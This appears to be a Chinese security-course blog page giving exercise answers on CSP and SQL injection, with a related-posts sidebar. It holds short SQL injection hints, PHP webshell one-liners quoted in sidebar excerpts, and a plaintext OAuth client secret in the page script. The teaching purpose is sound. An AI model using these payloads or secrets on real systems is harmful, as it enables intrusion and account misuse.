+<p>csp的代价是吧javascript代码和html网页彻底分离，这给开发者带来了诸多不便</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218185851337.png" alt="image-20230218185851337"></p>
+<p>不能 CSRF是在恶意网站上发出请求的 与csp（JS代码）无关</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218185935685.png" alt="image-20230218185935685"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $cspheader = &quot;Content-Security-Policy:&quot;.</span><br><span class="line">    			 &quot;default-src ’self’;&quot;.</span><br><span class="line">    			 &quot;script-src ’self’ ’nonce-1rA2345’ ’example.com’&quot;.</span><br><span class="line">    			 &quot;&quot;;</span><br><span class="line">    header($cspheader);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; nonce=&quot;1rA2345&quot;&gt;</span><br><span class="line">    //JavaScript Code...	1</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; nonce=&quot;2rB3333&quot;&gt;</span><br><span class="line">    //JavaScript Code...	2</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    //JavaScript Code...	3</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;script src=&quot;script.js&quot;&gt; &lt;/script&gt;		4</span><br><span class="line">    </span><br><span class="line">    &lt;script src=&quot;https://example.com/script2.js&quot;&gt; &lt;/script&gt;		5</span><br><span class="line">    </span><br><span class="line">    &lt;button onclick=&quot;alert(’hello’)&quot;&gt;Click me&lt;/button&gt;		6</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>1、4、5</p>
+<h1 id="11-Web-SQL-ex"><a href="#11-Web-SQL-ex" class="headerlink" title="11_Web_SQL_ex"></a>11_Web_SQL_ex</h1><p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230228182251868.png" alt="image-20230228182251868"></p>
+<p>yes</p>
+<p>闭合<code>&#39;)</code>，例如<code>1000, 256)&#39; #</code></p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230228182508057.png" alt="image-20230228182508057"></p>
+<p>no，输入不直接做拼接</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230228182648517.png" alt="image-20230228182648517"></p>
+<p>yes，在$eid和$password分别使用<code>/*</code>、<code>*/</code>，因为这个注释符是可以分行的</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230228183122508.png" alt="image-20230228183122508"></p>
+<p>yes</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230228183455322.png" alt="image-20230228183455322"></p>
+<p>直接注入$name就好了</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230228183734232.png" alt="image-20230228183734232"></p>
+<p><code>;</code></p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230228184042438.png" alt="image-20230228184042438"></p>
+<p>php中的mysqli扩展的<code>query()</code>函数不允许再数据库中运行多条语句，这是对sql注入的一种防护措施</p>
+<p>如果想运行多条sql语句们可以使用mysqli的<code>multi_query()</code></p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230228184211485.png" alt="image-20230228184211485"></p>
+<p>可以仔细构造注入并绕过任何过滤，因此单独过滤不是推荐的解决方案。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230228190411672.png" alt="image-20230228190411672"></p>
+<p>no，$eid直接从用户输入中读取，容易受到攻击</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230228190454306.png" alt="image-20230228190454306"></p>
+<p><code>$sql = &quot;UPDATE employee SET password=? WHERE eid=? and password=?&quot;;</code></p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230228190927973.png" alt="image-20230228190927973"></p>
+<p>SQL注入攻击仅修改从客户端（浏览器）传递到web服务器的查询字符串，实际查询在web服务器上运行，因此即使访问受到限制也会执行。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230228191149998.png" alt="image-20230228191149998"></p>
+<p>用户输入数据与可执行代码要分离</p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/post-cover/SEEDbooks.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<!-- <div>分享</div> -->
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+			<a href="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/" title="《信息安全导论》配套实验" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2022/12/11/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="《恶意代码分析实战》学习笔记" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/" title="《信息安全导论》配套实验">
+								《信息安全导论》配套实验			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 6日, 2023				
+							</p>
+							<p class="relate-post-content">
+								&#x3D;&#x3D;目前只有前两大章的内容，第三章网络安全还没看&#x3D;&#x3D;
+01_Environment_Variable_and_SetUIDTask 1: Manipulating Environment Var...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/" title="《信息安全导论》配套实验">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/SEEDbooks.jpg" alt="《信息安全导论》配套实验"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/07/07/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-SQLi/" title="Web漏洞整理-SQLi">
+								Web漏洞整理-SQLi			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								七月 7日, 2023				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] SQLi前言主要是之前练习了很多靶场所设计到的SQLi的笔记都比较分散这里就系统地整理下，主要是整合到一起，方便以后查阅
+整理自靶场练习Webgoat、pikachu、Web For Pentester、XVWA、sql...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/07/07/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-SQLi/" title="Web漏洞整理-SQLi">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/WebVuln1.jpg" alt="Web漏洞整理-SQLi"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" title="Linux攻防-权限维持及痕迹隐藏">
+								Linux攻防-权限维持及痕迹隐藏			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 17日, 2023				
+							</p>
+							<p class="relate-post-content">
+								零、Linux下的控守技术概述控守技术可以理解为权限维持技术，泛指攻击者获取目标机器的控制权限后，将该权限长久维持的技术和方法
+这里主要分为两大类：
+
+权限维持：能够在失去当前控制权限时，下次能更容易地重获权限的方法
+痕迹隐藏：能够使...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" title="Linux攻防-权限维持及痕迹隐藏">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux企鹅.png" alt="Linux攻防-权限维持及痕迹隐藏"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">
+								Web靶场-upload-labs			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								环境攻击机：kali 10.10.10.128靶机：Debian 11.1 x64 
+Pass-01任务：上传一个webshell到服务器
+直接怼，显示：
+
+改成basic.jpg，点击上传后bp抓包，修改后缀为.php，上传成功了：...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-upload-labs"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">
+								PHP-Web渗透中常见的高危函数以及伪协议			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								代码执行函数eval
+代码：&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;
+利用：http://10.10.10.3/test.php?cmd=phpinfo();
+assert
+代码：&lt;?...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/PHP.png" alt="PHP-Web渗透中常见的高危函数以及伪协议"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">
+								Webshell流量分析			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 1日, 2023				
+							</p>
+							<p class="relate-post-content">
+								菜刀一句话在这里：&lt;?php eval($_POST[&#39;myhack&#39;]) ?&gt;
+用的某个工具包里的菜刀，流量如下：
+
+agent有火狐5.0以及百度
+连接密码开头，用了array_map封装命令执行函数，...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/oiiai.jpg" alt="Webshell流量分析"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/04/22/Redis-%E9%85%8D%E7%BD%AE-%E5%91%BD%E4%BB%A4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="Redis-配置&命令&漏洞利用">
+								Redis-配置&命令&漏洞利用			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 22日, 2023				
+							</p>
+							<p class="relate-post-content">
+								Redis配置路径：/etc/redis/redis.conf
+允许远程主机访问数据库：NETWORK一栏，注释掉bind 127.0.0.1 ::1同时设置protected-mode no
+说明是这样的：
+
+意思是Redis仅允许...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/04/22/Redis-%E9%85%8D%E7%BD%AE-%E5%91%BD%E4%BB%A4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="Redis-配置&命令&漏洞利用">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Redis.png" alt="Redis-配置&amp;命令&amp;漏洞利用"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">
+								sqli-labs Stacked Injections			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 30日, 2023				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] sqli-labs Stacked Injections前言针对sqli-labs靶场的做题笔记
+环境虚拟机环境攻击机：kali | 10.10.10.1靶机：Debian 11.1 | 10.10.10.3 | Apa...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="sqli-labs Stacked Injections"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/12/11/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="《恶意代码分析实战》学习笔记">
+								《恶意代码分析实战》学习笔记			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十二月 11日, 2022				
+							</p>
+							<p class="relate-post-content">
+								第0章 恶意代码分析技术入门0.1 恶意代码分析目标
+确定某一可疑二进制程序能做什么
+编写对应的检测特征码
+基于主机的特征码
+基于网络的特征码
+
+
+使用特征码检测易感染主机
+弄清楚该恶意代码是如何工作的
+
+0.2 恶意代码分析技术
+静...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/12/11/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="《恶意代码分析实战》学习笔记">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/malware.jpg" alt="《恶意代码分析实战》学习笔记"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">
+								Web靶场-DSVW			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 25日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] DSVW靶场练习笔记前言是针对DSVW靶场的练习笔记是在搞完Pikachu靶场之后在整理vulnstack的Web安全入门进阶靶场时发现的里面版本比较老，就单独搞出来玩玩
+最新版本v0.2b用Python 3运行代码很顶...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-DSVW"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: 'Ov23liAb4iwJ1VAXeknf',
+			clientSecret: 'dbb92e8b0d3419b2a395abc8331a12e38e330e6c',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'Blog-Gitalk',
+			owner: 'ArcheriShade',
+			admin: 'ArcheriShade',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<!-- <div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+</div>
+
+
+				</div> -->
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by ArcheriShade. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+	<!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup scrollbar" >
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      		ESC
+   		</span>
+		<div class="local-search-header">
+			<div class="input-prompt">				
+			</div>
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
